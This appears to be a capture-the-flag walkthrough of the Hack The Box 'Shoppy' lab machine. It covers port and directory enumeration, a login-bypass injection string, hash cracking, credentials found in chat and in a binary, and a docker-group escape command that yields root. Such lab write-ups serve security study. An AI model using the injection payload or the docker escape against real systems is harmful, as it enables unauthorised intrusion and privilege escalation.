![Shoppy](https://user-images.githubusercontent.com/105310322/192341572-b03fb4d7-85fb-494b-aa87-72a33b104df5.png)

### Tools: Feroxbuster, Gobuster

### Vulnerabilities: Sqli, credentials in binary, docker

Our Nmap scan gives us ssh, http, and copycat are open. Copycat turned out to be a rabbit hole but lets take a look at the webpage.

```console
┌──(npayne㉿Nate-kali)-[~]
└─$ nmap -A -p- -T4 -Pn 10.129.70.70
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-23 11:41 CDT
Nmap scan report for 10.129.70.70
Host is up (0.074s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 9e:5e:83:51:d9:9f:89:ea:47:1a:12:eb:81:f9:22:c0 (RSA)
|   256 58:57:ee:eb:06:50:03:7c:84:63:d7:a3:41:5b:1a:d5 (ECDSA)
|_  256 3e:9d:0a:42:90:44:38:60:b3:b6:2c:e9:bd:9a:67:54 (ED25519)
80/tcp   open  http     nginx 1.23.1
|_http-title: Did not follow redirect to http://shoppy.htb
|_http-server-header: nginx/1.23.1
9093/tcp open  copycat?
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Content-Type: text/plain; version=0.0.4; charset=utf-8
|     Date: Fri, 23 Sep 2022 16:41:44 GMT
|     HELP go_gc_cycles_automatic_gc_cycles_total Count of completed GC cycles generated by the Go runtime.
|     TYPE go_gc_cycles_automatic_gc_cycles_total counter
|     go_gc_cycles_automatic_gc_cycles_total 4
|     HELP go_gc_cycles_forced_gc_cycles_total Count of completed GC cycles forced by the application.
|     TYPE go_gc_cycles_forced_gc_cycles_total counter
|     go_gc_cycles_forced_gc_cycles_total 0
|     HELP go_gc_cycles_total_gc_cycles_total Count of all completed GC cycles.
|     TYPE go_gc_cycles_total_gc_cycles_total counter
|     go_gc_cycles_total_gc_cycles_total 4
|     HELP go_gc_duration_seconds A summary of the pause duration of garbage collection cycles.
|     TYPE go_gc_duration_seconds summary
|     go_gc_duration_seconds{quantile="0"} 2.4952e-05
|     go_gc_duration_seconds{quantile="0.25"} 3.2798e-05
|_    go_gc_dur
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9093-TCP:V=7.92%I=7%D=9/23%Time=632DE1C7%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,252B,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\
SF:x20text/plain;\x20version=0\.0\.4;\x20charset=utf-8\r\nDate:\x20Fri,\x2
SF:023\x20Sep\x202022\x2016:41:44\x20GMT\r\n\r\n#\x20HELP\x20go_gc_cycles_
SF:automatic_gc_cycles_total\x20Count\x20of\x20completed\x20GC\x20cycles\x
SF:20generated\x20by\x20the\x20Go\x20runtime\.\n#\x20TYPE\x20go_gc_cycles_
SF:automatic_gc_cycles_total\x20counter\ngo_gc_cycles_automatic_gc_cycles_
SF:total\x204\n#\x20HELP\x20go_gc_cycles_forced_gc_cycles_total\x20Count\x
SF:20of\x20completed\x20GC\x20cycles\x20forced\x20by\x20the\x20application
SF:\.\n#\x20TYPE\x20go_gc_cycles_forced_gc_cycles_total\x20counter\ngo_gc_
SF:cycles_forced_gc_cycles_total\x200\n#\x20HELP\x20go_gc_cycles_total_gc_
SF:cycles_total\x20Count\x20of\x20all\x20completed\x20GC\x20cycles\.\n#\x2
SF:0TYPE\x20go_gc_cycles_total_gc_cycles_total\x20counter\ngo_gc_cycles_to
SF:tal_gc_cycles_total\x204\n#\x20HELP\x20go_gc_duration_seconds\x20A\x20s
SF:ummary\x20of\x20the\x20pause\x20duration\x20of\x20garbage\x20collection
SF:\x20cycles\.\n#\x20TYPE\x20go_gc_duration_seconds\x20summary\ngo_gc_dur
SF:ation_seconds{quantile=\"0\"}\x202\.4952e-05\ngo_gc_duration_seconds{qu
SF:antile=\"0\.25\"}\x203\.2798e-05\ngo_gc_dur")%r(HTTPOptions,252B,"HTTP/
SF:1\.0\x20200\x20OK\r\nContent-Type:\x20text/plain;\x20version=0\.0\.4;\x
SF:20charset=utf-8\r\nDate:\x20Fri,\x2023\x20Sep\x202022\x2016:41:44\x20GM
SF:T\r\n\r\n#\x20HELP\x20go_gc_cycles_automatic_gc_cycles_total\x20Count\x
SF:20of\x20completed\x20GC\x20cycles\x20generated\x20by\x20the\x20Go\x20ru
SF:ntime\.\n#\x20TYPE\x20go_gc_cycles_automatic_gc_cycles_total\x20counter
SF:\ngo_gc_cycles_automatic_gc_cycles_total\x204\n#\x20HELP\x20go_gc_cycle
SF:s_forced_gc_cycles_total\x20Count\x20of\x20completed\x20GC\x20cycles\x2
SF:0forced\x20by\x20the\x20application\.\n#\x20TYPE\x20go_gc_cycles_forced
SF:_gc_cycles_total\x20counter\ngo_gc_cycles_forced_gc_cycles_total\x200\n
SF:#\x20HELP\x20go_gc_cycles_total_gc_cycles_total\x20Count\x20of\x20all\x
SF:20completed\x20GC\x20cycles\.\n#\x20TYPE\x20go_gc_cycles_total_gc_cycle
SF:s_total\x20counter\ngo_gc_cycles_total_gc_cycles_total\x204\n#\x20HELP\
SF:x20go_gc_duration_seconds\x20A\x20summary\x20of\x20the\x20pause\x20dura
SF:tion\x20of\x20garbage\x20collection\x20cycles\.\n#\x20TYPE\x20go_gc_dur
SF:ation_seconds\x20summary\ngo_gc_duration_seconds{quantile=\"0\"}\x202\.
SF:4952e-05\ngo_gc_duration_seconds{quantile=\"0\.25\"}\x203\.2798e-05\ngo
SF:_gc_dur");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 117.17 seconds
```

Before we can access the page we need to add it to /etc/hosts. At the same time lets run a feroxbuster for more directories and a gobuster for more domain enumeration.

Feroxbuster gets back to us with a login page that is vulnerable. These 2 links will help but do not have the direct answer.
https://book.hacktricks.xyz/pentesting-web/login-bypass

https://book.hacktricks.xyz/pentesting-web/nosql-injection

```console
└──╼ [★]$ feroxbuster -u http://shoppy.htb/ -w /usr/share/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x php.html,txt,git -q
301       10l       16w      179c http://shoppy.htb/images
301       10l       16w      171c http://shoppy.htb/js
301       10l       16w      173c http://shoppy.htb/css
200       26l       62w     1074c http://shoppy.htb/login
302        1l        4w       28c http://shoppy.htb/admin
301       10l       16w      179c http://shoppy.htb/assets
301       10l       16w      187c http://shoppy.htb/assets/css
301       10l       16w      185c http://shoppy.htb/assets/js
301       10l       16w      187c http://shoppy.htb/assets/img
301       10l       16w      177c http://shoppy.htb/fonts
301       10l       16w      191c http://shoppy.htb/assets/fonts
301       10l       16w      203c http://shoppy.htb/assets/img/avatars
301       10l       16w      181c http://shoppy.htb/exports
200       57l      129w     2178c http://shoppy.htb/
```

A friend was able to use this slqi to get in (Still need to ask how he came to the conclusion)


Since one of the usernames is admin we can put that in front of our sqlinjection.

After inputting this string ```admin'||'1==1``` we are in.

![image](https://user-images.githubusercontent.com/105310322/192317020-b61ec9df-37b4-477e-93e2-6b14b288cfca.png)


Now if we navigate to search for more users and input the same sqli it will populate the users on the system.

We get some hashes for the users and if we put josh's in to a hash cracker we get a password!

![image](https://user-images.githubusercontent.com/105310322/192316925-2bf380d6-61d9-4aec-8ae0-4f8e7551d39d.png)


With the password ```remembermethisway``` and username ```josh``` we can go to the next step.

These creds were not for ssh but Gobuster finds a subdomain as mattermost, most of the other worldlists did not have this particular domain but if you were to google the the nmap info that returned for port 9093 you can find a hint for the mattermost server that is running. Such as the link below that my google search returned.

http://push.mattermost.com/metrics

```console

└──╼ [★]$ gobuster vhost -u http://shoppy.htb/ -w /usr/share/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -q

Found: mattermost.shoppy.htb (Status: 200) [Size: 3122]
```

Navigating to the site brings us another login.

![image](https://user-images.githubusercontent.com/105310322/192318703-c2ad5e68-8e51-46df-94c1-29b628552852.png)

Inputting Josh as the username and the password we cracked ```remembermethisway``` get us inside.

Navigating around we find a password listed. Nice lets try that in SSH.

![image](https://user-images.githubusercontent.com/105310322/192319017-5dfd3369-63f1-48e4-ace0-10c184737abd.png)


Whoo, we are finally on the box!

```console
└──╼ [★]$ ssh jaeger@10.129.69.87
The authenticity of host '10.129.69.87 (10.129.69.87)' can't be established.
ECDSA key fingerprint is SHA256:KoI81LeAk+ps7zoc1ru39Mg7srdxjzOb1UgmdW6T6kI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.69.87' (ECDSA) to the list of known hosts.
jaeger@10.129.69.87's password: 
Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
manpath: can't set the locale; make sure $LC_* and $LANG are correct
jaeger@shoppy:~$ 
```
```console
jaeger@shoppy:/home/deploy$ cat /home/jaeger/user.txt 
f6e8****************************
```

For the next step if we do ```sudo -l``` it reveals that we can run password-manager as root but there were not any immediate exploits for this. However if we cat this file we find a simple password ```Sample```

```
�u��}�u2�}���u)H�=�.�����H�u,H�5�.H��+H���/������UH���������]��AWL�=W)AVI��AUI��ATA��UH�-P)SL)�H�����H��t�L��L��D��A��H��H9�u�H�[]A\A]A^A_��H�H��Welcome to Josh password manager!Please enter your master password: SampleAccess granted! Here is creds !cat /home/deploy/creds.txtAccess denied! This incident will be reported !@����0����@���h%����
```

Doing gets us another login for deploy! and we can run bash for a cleaner shell.

```console
jaeger@shoppy:/home/deploy$ sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: Sample
Access granted! Here is creds !
Deploy Creds :
username: deploy
password: Deploying@pp!
jaeger@shoppy:/home/deploy$ ^C
jaeger@shoppy:/home/deploy$ su Deploy
su: user Deploy does not exist or the user entry does not contain all the required fields
jaeger@shoppy:/home/deploy$ su deploy
Password: 
$ bash
deploy@shoppy:~$ ls
creds.txt  password-manager  password-manager.cpp
deploy@shoppy:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for deploy: 
Sorry, user deploy may not run sudo on shoppy.
```
For the next step I ran linpeas on the machine and I got that Deploy is part of the docker group.

If we can leverage docker we can easily gain root.

```
                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════                              
                               ╚═══════════════════╝                                                             
OS: Linux version 5.10.0-18-amd64 (debian-kernel@lists.debian.org) (gcc-10 (Debian 10.2.1-6) 10.2.1 20210110, GNU ld (GNU Binutils for Debian) 2.35.2) #1 SMP Debian 5.10.140-1 (2022-09-02)
User & Groups: uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
```

Hacktricks is amazing and has good stuff on docker. As well as our command string for the exploit.

https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#docker-group


Do a quick check for the type of docker image and then add that into our command.

Voila we have root and the flag!

```
deploy@shoppy:/tmp$ docker images
REPOSITORY   TAG       IMAGE ID       CREATED        SIZE
alpine       latest    d7d3d98c851f   2 months ago   5.53MB
deploy@shoppy:/tmp$ docker run --rm -it --pid=host --net=host --privileged -v /:/mnt alpine chroot /mnt bashbashchroot: can't execute 'bashbash': No such file or directory
deploy@shoppy:/tmp$ docker run --rm -it --pid=host --net=host --privileged -v /:/mnt alpine chroot /mnt bash
root@shoppy:/# cat /root/root.txt
c5a7****************************
```
GG!
